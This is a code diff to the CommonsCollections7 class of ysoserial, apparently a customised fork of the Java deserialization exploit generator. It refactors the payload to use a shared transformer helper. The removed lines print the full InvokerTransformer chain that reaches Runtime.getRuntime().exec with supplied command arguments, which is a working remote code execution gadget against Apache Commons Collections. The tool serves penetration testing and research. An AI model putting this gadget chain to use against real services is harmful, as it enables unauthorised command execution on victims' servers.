@@ -8,6 +8,7 @@ import org.apache.commons.collections.map.LazyMap;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.custom.CommonsCollectionsUtil;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
@@ -45,18 +46,7 @@ public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
-        final Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new InvokerTransformer("getMethod",
-                new Class[]{String.class, Class[].class},
-                new Object[]{"getRuntime", new Class[0]}),
-            new InvokerTransformer("invoke",
-                new Class[]{Object.class, Object[].class},
-                new Object[]{null, new Object[0]}),
-            new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
-            new ConstantTransformer(1)};
+        final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);
 
         Map innerMap1 = new HashMap();
         Map innerMap2 = new HashMap();
@@ -81,7 +71,7 @@ public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<
         return hashtable;
     }
 
-    public static void main(final String[] args) throws Exception {
+    public static void main(String[] args) throws Exception {
         PayloadRunner.run(CommonsCollections7.class, args);
     }
 }
